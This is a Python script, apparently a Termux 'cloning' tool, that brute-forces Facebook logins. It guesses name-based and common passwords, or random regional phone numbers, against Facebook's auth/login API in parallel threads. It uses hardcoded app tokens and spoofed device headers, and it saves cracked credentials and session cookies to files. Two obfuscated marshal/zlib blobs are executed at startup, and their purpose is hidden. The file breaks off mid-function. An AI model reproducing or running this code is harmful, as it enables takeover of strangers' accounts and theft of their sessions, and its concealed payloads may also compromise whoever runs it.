#coding = utf-8
#Coded By NADEEM DOGAR
import os
os.system("pkg install espeak -y")
import os,sys,glob,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re,hashlib
import datetime,subprocess
import zipfile
import marshal
from uuid import uuid4
from time import sleep as sp
print(f'\x1b[1;91m [\x1b[1;92m+\x1b[1;91m]\x1b[1;92m WELCOME TO  JUTT TOOL :')
os.system('espeak -a 300 " Wellcome,   To,  ,JUTT ,Tool,"')
hashes = []

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)

from concurrent.futures import ThreadPoolExecutor as NADEEMG
import requests
from requests.exceptions import ConnectionError as CE

try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'
#_________[ PROXY SERVER ]______>>
#try:
    #prox= requests.get('https://github.com/NADEEMnadeem5214/File11/Control_Room/blob/main/.prox.txt').text
    #open('.prox.txt','w').write(prox)
#except Exception as e:
    #pass
#prox=open('.prox.txt','r').read().splitlines()
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
#####_____Folder-Setup_____#####
try:
	os.makedirs('/sdcard/SOBIYA')
except:
		pass
#___________ [ Lists Used in Script]________
id = []
ok = []
cp = []
loop = 0
ugen=[]
method=[]
sys.stdout.write('\x1b]2; JUTT\x07')
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf34\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00\x02\x00e\x01\x02\x00e\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x03c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\xd8\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x00d\x00d\x04\x85\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x05N\xda\x07marshal\xda\x04zlib\xda\x06base64\xe9\xff\xff\xff\xff)\x04\xda\n__import__\xda\x05loads\xda\ndecompress\xda\tb64decode)\x01\xda\x02__s\x01\x00\x00\x00 \xfa\x01 \xfa\x08<lambda>r\r\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\x80\x00\x95\n\x989\xd1\x10%\xd4\x10%\xd7\x10+\xd2\x10+\xadJ\xb0v\xd1,>\xd4,>\xd7,I\xd2,I\xcd*\xd0U]\xd1J^\xd4J^\xd7Jh\xd2Jh\xd0ik\xd0lp\xd0lp\xd0np\xd0lp\xd4iq\xd1Jr\xd4Jr\xd1,s\xd4,s\xd1\x10t\xd4\x10t\x80\x00\xf3\x00\x00\x00\x00s4#\x00\x00=)\x02\xda\x01_\xda\x04exec\xa9\x00r\x0e\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r\x12\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x04t\xd0\x04t\x80\x01\xd0uy\xd0uy\xd0{|\xd0{|\xf0\x00\x00\x7f\x01vN\x02\xf1\x00\x00{\x01wN\x02\xf4\x00\x00{\x01wN\x02\xf1\x00\x00v\x01xN\x02\xf4\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02r\x0e\x00\x00\x00'))
exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3B\x00\x00\x00\x97\x00\x02\x00e\x00e\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x02s.\x01\x00\x00x^\xcd\x94AK\xc3@\x10\x85\xef\xf9\x15#\x05\x9b \xdd\x98\xa6 \xb6\xb5Pz\xb1`=\x08\n\x12KY\x93!Yhv\xd3\xddI\x8d\xff\xde\x8di\xecEo\x122\xa7\xc7\xce\xf2\xde\xeewx\x83\xf9|\xd7N\x04\x1b\xa4L%\x10\xc0\xb3A=Z\xa6(\t\xb6?\xfb\xc5b\xe0\x90\xfe\x9c:`'\xe1\xc4\xe1\x0e4\x1eJ4dX\x8a\xe4\x0e3\xa2\xc2L}_\xf3\x0f\x96\n\xca\xca\xf7\xd2\x1a\xc5J\x92ub\xb1\xca\xfd\xb5\xe1\x87\xd1\xa6\xd4&\x13\x89\xff\xc4%\xf7s.\xa4\xbf\t\x86\x1e#\xac\xe8\xdb\x1b+\x8c\xdd:\xc0s\xb0\x8a\xb1\xa0&\xb2\xd0B\xda\x90\xb7\xeb0\x8cnofA\x0eQ\xa3\x03\xab\xaf\xce\xc7\xdbF\x8e\xeb\x1b\xaf\xaa\x84{~DxT\xb0\xb6\xcf\xd0\x12\tVJJ\x8cI(\t\x8c]\x0c\xbd\x19V\x82\\\xcf\x19\xfc\x06c\xdc=\x8cqoa\x84\xdd\xc3\x08{\x0bc\xd2=\x8cI\xff`,\xf7\xfb\xb67V*A\xb8\x84\x07\x15w\xd3\x1au\xde\xce\xa6\xf5\x0fJ\xddl\xf0\x82\xda\xd4\x1d\xf3G\x83\x1eO\xeb\x7f+\xd1:tgC[\x1c\x9dv\xe7\xf97'\xc5\x0ciQ\xb8\xde\x17\x98F\x07\xfaN)\x03\xda\x04exec\xda\x04zlib\xda\ndecompress\xa9\x00\xf3\x00\x00\x00\x00\xfa\x01 \xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s@\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x04\x80\x04\x80T\x87_\x82_\xf0\x00\x00\x16s\r\xf1\x00\x00\x06t\r\xf4\x00\x00\x06t\r\xf1\x00\x00\x01u\r\xf4\x00\x00\x01u\r\xf0\x00\x00\x01u\r\xf0\x00\x00\x01u\r\xf0\x00\x00\x01u\rr\x06\x00\x00\x00"))
#####_____COLOR_____#####
G ='\033[92;1m'
W ='\033[97;1m'
B='\033[94;1m'
R ='\033[91;1m'
Y='\033[93;1m'
P='\033[95;1m'
S='\033[96;1m'
def logo():
	os.system('clear')
	logo = (f"""
{Y}      `7MMF'`7MMF'   `7MF'MMP""MM""YMM MMP""MM""YMM 
{G}        MM    MM       M  P'   MM   `7 P'   MM   `7 
{Y}        MM    MM       M       MM           MM      
{G}        MM    MM       M       MM           MM      
{Y}        MM    MM       M       MM           MM      
{G}   (O)  MM    YM.     ,M       MM           MM      
{Y}    Ymmm9      `bmmmmd"'     .JMML.       .JMML.    
     {R}ONWER.    : JUTT 
     {W}GITHUB.   : NOT FOUND
     {G}WHATSAPP  : 03270864393""")
	print(logo)
def clear():
	os.system("clear")
	logo()
def line():
	print(f"{W}------------------------------------------------")
#####____string remover_____#####
def remove_symbols_and_spaces(input_strings):
    cleaned_strings = re.sub(r'[^a-zA-Z0-9#]', '', input_strings)
    return cleaned_strings    

#####_____Main-Menu_____#####
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""

NADEEM_token = f'{id}{xp}'

def connection_token():
	digits_count = 16
	letters_count = 16
	letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	#Convert resultant string to list and shuffle it to mix letters and digits
	sample_list = list(letters + digits)
	random.shuffle(sample_list)
	#convert list to string
	final_string = ''.join(sample_list)
	return final_string

nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:

	
	
	def __init__(self):
		
		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
		#heck_again()
		logo()
		line()
		os.system('espeak -a 300 " Main     ,Menu, "')
		line()
		print(f"{W} [{R}1{W}] {W}FILE CLONING     {W}[{G}WORKING{W}] {W}")
		print(f"{W} [{R}2{W}] {W}FILE CREATE MENU    {W}[{G}WORKING{W}] {W}")
		print(f"{W} [{R}3{W}] {W}RANDOM NUM CLONING     {W}[{G}WORKING{W}] {W}")
		print(f"{W} [{R}4{W}] {W}SEPRATE LINKS FROM FILE    {W}[{G}WORKING{W}] {W}")
		print(f"{W} [{R}5{W}] {W}CUT USED LINK & CHANGE PASS  {W}[{G}WORKING{W}] {W}")
		print(f"{W} [{R}0{W}] {R}EXIT FROM TEHREEM TOOL {W}[{G}x{W}] {W}")
		line()
		line()
		opt1 = input(f"{W} [{R}+{W}] {W}SELECT ONE : ")
		if opt1 == "1":self.file_menu()
		elif opt1 == "2":Create_menu()
		elif opt1 == "3":Main_Menu()
		elif opt1 == "4":Grep().with_names()
		elif opt1 == "5":automation().menu()
		elif opt1 == "0":exit("{W} [{R}+{W}] {W}THANKS FOR USING NADEEM TOOL!!!!!!! ")
		else:print(f"{W} [{R}+{W}] {W}WRONG SELECT ");sp(2);self.iAmMenu()
	
	
	def file_menu(self):
		#check_again()
		logo()
		os.system('espeak -a 300 " Enter,   File,  , Name,"')
		print(f"{W} [{R}+{W}] {G}EXAMPLE /sdcard/filename.txt")
		line()
		file = input(f"{W} [{R}+{W}] {W}PUT FILE PATH : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			print(f"{W} [{R}+{W}] {W}INCORECT FILE PATH ")
			sp(2);self.file_menu()
		
	def method_select(self,id):
		#check_again()
		logo()
		os.system('espeak -a 300 " Select, Method,"')
		line()
		print(f"{W} [{R}1{W}] {W}METHOD  \033[1;92m[FOR NEW IDS]{W}")
		print(f"{W} [{R}2{W}] {W}METHOD  \033[1;92m[FOR OLD IDS]{W}")
		line()
		m_opt = input(f"{W} [{R}+{W}] {W}SELECT ONE : ")
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		elif m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		#elif m_opt =="3":
			#method.append('iii')
			#self.password_menu(id)
		#elif m_opt =="4":
			#method.append('iiii')
			#self.password_menu(id)
		#elif m_opt =="5":
			#method.append('iiiii')
			#self.password_menu(id)
		#elif m_opt =="6":
			#method.append('iiiiii')
			#self.password_menu(id)
		else:print(f"{W} [{R}+{W}] {W} WRONG SELECT ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		#check_again()
		pwx=[]
		logo()
		max = 40
		print(f"{W} [{R}+{W}] {W}EXAMPLE 5 , 10 , 20  to 40 Max ")
		os.system('espeak -a 300 " Put,   Password,  ,Limit,"')
		try:
			plimit = int(input(f"{W} [{R}+{W}] {W}PASS LIMIT : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				print(f"{W} [{R}+{W}] {W}PASS LIMIT UNDER 40 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		print(f"{W} [{R}+{W}] {G}EX : first last First Last etc ")
		line()
		for n in range(plimit):
			pwx.append(input(f"{W} [{R}+{W}] {W}PUT PASS %s : "%(n+1)))
		logo()
		os.system('espeak -a 300 " Process,   will  be,   Started,    ,Please  Wait,"')
		line()
		print(f"{W} [{R}+{W}] {W}TOTAL ACCOUNTS : \033[1;92m%s "%(str(len(id))))
		print(f"{W} [{R}+{W}] {W}CRACKING START NOW....... ")
		print(f"{W} [{R}+{W}] {R}USE FLIGHT MODE AFTER 5 MINTS! ")
		line()
		with NADEEMG(max_workers=30) as NADEEMgg:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					NADEEMgg.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					NADEEMgg.submit(self.method2,uid,nm,pwx)
				#elif "iii" in method:
					#NADEEMgg.submit(self.method3,uid,nm,pwx)
				#elif "iiii" in method:
					#NADEEMgg.submit(self.method4,uid,nm,pwx)
				#elif "iiiii" in method:
					#NADEEMgg.submit(self.method5,uid,nm,pwx)
				#elif "iiiiii" in method:
					#NADEEMgg.submit(self.method6,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()
		os.system('espeak -a 300 " Process,   Completed,  ,Dear,"')
		print(f"{W} [{R}+{W}] {W} PROCESS COMPLETE ")
		print(f"{W} [{R}+{W}] {W} OK IDZ : \033[1;92m%s "%(len(ok)))
		print(f"{W} [{R}+{W}] {W} CP IDZ : {R}%s "%(len(cp)))
		line()
		input(f"{W} [{R}+{W}] {W} PRESS ENTER TO BACK ")
		self.iAmMenu()
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f'\r\r{W} [{R}NADEEM{W}]{R} %s{W} | {R}M1 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				#ua1 = random.choice(M1)
				#nip=random.choice(prox)
				#proxs= {'http': 'socks5://'+nip}
				data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'cpl': 'true',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'device_based_login_password',
'error_detail_type': 'button_with_disabled',
'source': 'register_api',
'email': uid,
'password': pw,
'access_token': '275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'generate_session_cookies': '1',
'meta_inf_fbmeta': 'NO_FILE',
'advertiser_id': str(uuid.uuid4()),
'currently_logged_in_userid': '0',
'locale': 'en_US',
'client_country_code': 'US',
'method': 'auth.login',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
'api_key': '882a8490361da98702bf97a021ddc14d',
'sig': '1d2d2c81b7ac43af4db39465bf23e77e'}
				headers={'Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'X-FB-Net-HNI': '20083',
'User-Agent': M1(),
'X-FB-Client-IP': 'True',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-SIM-HNI': '37460',
'X-Tigon-Is-Retry': 'False',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Connection-Quality': 'MOBILE.LTE',
'X-FB-Server-Cluster': 'True',
'Connection': 'keep-alive',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Host': 'graph.facebook.com',
'X-FB-Connection-Bandwidth': '80025933',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'Accept-Encoding': 'gzip, deflate',
'X-FB-Connection-Type': 'MOBILE.LTE',
'Content-Type': 'application/x-www-form-urlencoded'}
				q = requests.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				if "session_key" in q:
					#token = q["access_token"]
					print(f'\r{G} [NADEEM-OK] %s | %s {W} '%(uid,pw))
					os.system('espeak -a 300 " Crack,   Successfully,"')
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					NADEEM1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NADEEM1};{ckkk}"
					print(f'\r\033[1;92m [COOKIES] : '+cookie)
					line()
					#open('/sdcard/NADEEM/NADEEM-COOKIE_TOKEN.txt','a').write(cookie+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/NADEEM/NADEEM_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/NADEEM/NADEEM_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#print(f'\r{R} [NADEEM-CP] %s | %s {W} '%(uid,pw))
					cp.append(uid)
					open('/sdcard/NADEEM/NADEEM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f'\r\r{W} [{R}NADEEM{W}]{R} %s{W} | {R}M2 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				#ua2 = random.choice(M2)
				#nip=random.choice(prox)
				#proxs= {'http': 'socks5://'+nip}
				data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': uid,'password': pw,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
				headers={'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': M4(),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '22'}
				q = requests.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				if "session_key" in q:
					#token = q["access_token"]
					print(f'\r{G} [NADEEM-OK] %s | %s {W} '%(uid,pw))
					os.system('espeak -a 300 " Crack,   Successfully,"')
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					NADEEM1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NADEEM1};{ckkk}"
					#print(f'\r\033[1;92m [COOKIES] : '+cookie)
					#line()
					#open('/sdcard/NADEEM/NADEEM-COOKIE_TOKEN.txt','a').write(cookie+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/NADEEM/NADEEM_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/NADEEM/NADEEM_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#print(f'{P} [NADEEM-CP] %s | %s {W} '%(uid,pw))
					cp.append(uid)
					open('/sdcard/NADEEM/NADEEM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
	
def Main_Menu():
    clear()
    print(f'{W} [{R}1{W}] {W}PAK CLONING\n{W} [{R}2{W}] {W}BD CLONING\n{W} [{R}3{W}] {W}AFG CLONING\n{W} [{R}4{W}] {W}INDIA CLONING\n{W} [{R}0{W}] {W}BACK MENU')
    line()
    option=input(f'{W} [{R}+{W}] {W}CHOICE MENU >> ')
    if option in ['1','01']:
        pak()
    if option in ['2','02']:
        bd()
    if option in ['3','03']:
        afg()
    if option in ['4','04']:
        ind()
    if option in ['0','00']:
    	iAmMain().iAmMenu()
    else:
    	line()
    print(f'{W} [{R}+{W}] {W}SELECTED WRONG OPTION')
    time.sleep(2)
    Main_Menu()
#####____Random-Method-Setup____#####
def pak():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 0300,0315,0333,0345')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with NADEEMG(max_workers=60) as NADEEMg1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist=[psx,ids,'khan khan','khan1122','khan786','khankhan','malik123','kingkhan','baloch123','pak123','khan123','janjan','ali123','pakistan','pakistan786']
                                NADEEMg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                iAmMain().iAmMenu()
def bd():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 017,016,018')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with NADEEMG(max_workers=60) as NADEEMg1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
                                NADEEMg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W} THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W} TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W} PRESS ENTER TO BACK ')
                iAmMain().iAmMenu()

def afg():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 9377,9379,9374')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with NADEEMG(max_workers=60) as NADEEMg1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                NADEEMg1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                iAmMain().iAmMenu()
def ind():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 91***,etc')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with NADEEMG(max_workers=60) as NADEEMgg:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan','57575751']
                                NADEEMgg.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                iAmMain().iAmMenu()
                
def rd(uid,passlist):
	try:
